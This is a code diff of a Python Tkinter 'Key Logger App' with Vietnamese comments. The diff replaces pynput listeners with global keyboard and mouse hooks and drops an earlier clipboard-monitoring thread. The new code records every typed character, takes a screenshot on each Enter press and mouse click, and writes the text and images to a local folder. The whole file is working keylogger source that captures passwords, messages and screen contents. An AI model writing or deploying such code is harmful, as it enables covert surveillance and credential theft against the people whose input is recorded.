@@ -1,16 +1,14 @@
 import tkinter as tk
-from pynput import keyboard, mouse
+import keyboard
+import mouse
 import pyautogui
 import os
-import time
-import win32clipboard
-import threading
 
 class KeyLoggerApp:
     def __init__(self, root):
         self.root = root
         self.root.title("Key Logger App")
-        self.root.geometry("800x600")  # You can adjust the size as needed
+        self.root.geometry("800x600")
 
         self.stop_button = tk.Button(root, text="Stop Recording", command=self.stop_recording, state=tk.NORMAL)
         self.stop_button.pack(pady=10)
@@ -18,104 +16,115 @@ class KeyLoggerApp:
         self.restart_button = tk.Button(root, text="Restart Recording", command=self.restart_recording, state=tk.DISABLED)
         self.restart_button.pack(pady=10)
 
-        self.pressed_keys = []
-        self.clipboard_logs = []
+        self.current_text = []  # Lưu chuỗi hoàn chỉnh
         self.screenshot_count = 1
-        self.recording_counter = 1
+
+        # Đường dẫn lưu trữ
         self.output_path = "D:/code_dao/py/output/"
         self.screenshot_path = os.path.join(self.output_path, "screenshots/")
-        self.keys_file_path = os.path.join(self.output_path, f"recorded_keys_{self.recording_counter}.txt")
 
-        os.makedirs(self.screenshot_path, exist_ok=True)
+        # Kiểm tra và tạo thư mục
+        self.initialize_directories()
 
-        self.keyboard_listener = None
-        self.mouse_listener = None
+        self.is_listening = False
 
-        # Start recording automatically
-        self.start_recording()
-
-    def clean_path(self, path):
-        valid_chars = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\")
-        return ''.join(char for char in path if char in valid_chars)
-
-    def on_press(self, key):
+    def initialize_directories(self):
+        """Tạo các thư mục cần thiết nếu chưa tồn tại."""
         try:
-            key_str = key.char
-        except AttributeError:
-            key_str = f"Special key {key}"
+            os.makedirs(self.screenshot_path, exist_ok=True)
+            print(f"Directories initialized: {self.screenshot_path}")
+        except Exception as e:
+            print(f"Error creating directories: {e}")
+            tk.messagebox.showerror("Error", f"Failed to initialize directories: {e}")
 
-        self.pressed_keys.append(key_str)
-        print(f"Pressed key: {key_str}")
+    def capture_screenshot(self):
+        """Chụp và lưu ảnh màn hình."""
+        screenshot_name = f"screenshot_{self.screenshot_count}.png"
+        screenshot_path = os.path.join(self.screenshot_path, screenshot_name)
 
-    def on_click(self, x, y, button, pressed):
-        if pressed:
-            clean_path_screenshot_path = self.clean_path(self.screenshot_path)
-            os.makedirs(clean_path_screenshot_path, exist_ok=True)
-            screenshot_name = f"screenshot_{self.screenshot_count}_{self.recording_counter}.png"
+        try:
+            pyautogui.screenshot(screenshot_path)
+            print(f"Screenshot captured and saved: {screenshot_path}")
             self.screenshot_count += 1
-            self.root.after(1, lambda: self.capture_screenshot(screenshot_name))
+        except Exception as e:
+            print(f"Error capturing screenshot: {e}")
 
-    def capture_screenshot(self, screenshot_name):
-        screenshot = pyautogui.screenshot()
-        screenshot.save(os.path.join(self.screenshot_path, screenshot_name))
-        print(f"Screenshot captured: {screenshot_name}")
+    def handle_keyboard_event(self, event):
+        """Xử lý sự kiện bàn phím."""
+        if event.event_type == "down":  # Chỉ xử lý sự kiện nhấn phím
+            key = event.name
+
+            # Xử lý phím đặc biệt
+            if key == "space":
+                self.current_text.append(" ")
+            elif key == "enter":
+                self.current_text.append("\n")
+                self.capture_screenshot()  # Chụp màn hình khi nhấn Enter
+            elif len(key) == 1:  # Là một ký tự đơn
+                self.current_text.append(key)
+            else:
+                # Log các phím đặc biệt khác nếu cần
+                print(f"Special key pressed: {key}")
+
+    def handle_mouse_event(self, event):
+        """Xử lý sự kiện nhấn chuột."""
+        if isinstance(event, mouse.ButtonEvent) and event.event_type == "down":
+            self.capture_screenshot()  # Chụp màn hình khi nhấn chuột trái/phải
+
+    def get_unique_file_path(self, base_name="recorded_keys"):
+        """Tạo đường dẫn tệp có số thứ tự tăng dần nếu tệp đã tồn tại."""
+        counter = 1
+        while True:
+            file_path = os.path.join(self.output_path, f"{base_name}_{counter}.txt")
+            if not os.path.exists(file_path):
+                return file_path
+            counter += 1
+
+    def save_to_file(self):
+        """Lưu văn bản đã gõ vào tệp."""
+        file_path = self.get_unique_file_path()  # Lấy tên tệp mới không trùng
+        try:
+            with open(file_path, "w", encoding="utf-8") as file:
+                file.write("".join(self.current_text))
+            print(f"Recorded keys saved to: {file_path}")
+        except Exception as e:
+            print(f"Error saving file: {e}")
 
     def start_listening(self):
-        self.keyboard_listener = keyboard.Listener(on_press=self.on_press)
-        self.mouse_listener = mouse.Listener(on_click=self.on_click)
-        self.keyboard_listener.start()
-        self.mouse_listener.start()
+        """Bắt đầu lắng nghe sự kiện."""
+        self.is_listening = True
+        keyboard.hook(self.handle_keyboard_event)  # Lắng nghe bàn phím
+        mouse.hook(self.handle_mouse_event)        # Lắng nghe chuột
 
     def stop_listening(self):
-        if self.keyboard_listener:
-            self.keyboard_listener.stop()
-        if self.mouse_listener:
-            self.mouse_listener.stop()
+        """Dừng lắng nghe sự kiện."""
+        if self.is_listening:
+            keyboard.unhook_all()
+            mouse.unhook_all()
+            self.is_listening = False
 
     def start_recording(self):
+        """Bắt đầu ghi lại sự kiện."""
         self.stop_button.config(state=tk.NORMAL)
         self.restart_button.config(state=tk.DISABLED)
-        self.pressed_keys = []
-        self.clipboard_logs = []
+        self.current_text = []
         self.screenshot_count = 1
-        self.recording_counter += 1
-        self.keys_file_path = os.path.join(self.output_path, f"recorded_keys_{self.recording_counter}.txt")
         self.start_listening()
 
-        # Start clipboard monitoring in a separate thread
-        threading.Thread(target=self.monitor_clipboard).start()
-
     def stop_recording(self):
+        """Dừng ghi lại sự kiện."""
         self.stop_button.config(state=tk.DISABLED)
         self.restart_button.config(state=tk.NORMAL)
         self.stop_listening()
 
-        # Specify the encoding as 'utf-8' when opening the file
-        with open(self.keys_file_path, "w", encoding="utf-8") as keys_file:
-            keys_file.write("Recorded keys:\n")
-            keys_file.write("\n".join(self.pressed_keys))
-            keys_file.write("\n\nClipboard logs:\n")
-            keys_file.write("\n".join(self.clipboard_logs))
-            print(f"Recorded data saved to: {self.keys_file_path}")
+        # Lưu văn bản vào tệp
+        self.save_to_file()
 
     def restart_recording(self):
-        self.stop_button.config(state=tk.NORMAL)
-        self.restart_button.config(state=tk.DISABLED)
+        """Khởi động lại việc ghi sự kiện."""
         self.start_recording()
 
-    def monitor_clipboard(self):
-        while True:
-            win32clipboard.OpenClipboard()
-            clipboard_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            if clipboard_data and clipboard_data not in self.clipboard_logs:
-                self.clipboard_logs.append(clipboard_data)
-                print(f"Clipboard log: {clipboard_data}")
-            time.sleep(1)
-
 if __name__ == "__main__":
-    import threading
-
     root = tk.Tk()
     app = KeyLoggerApp(root)
     root.mainloop()
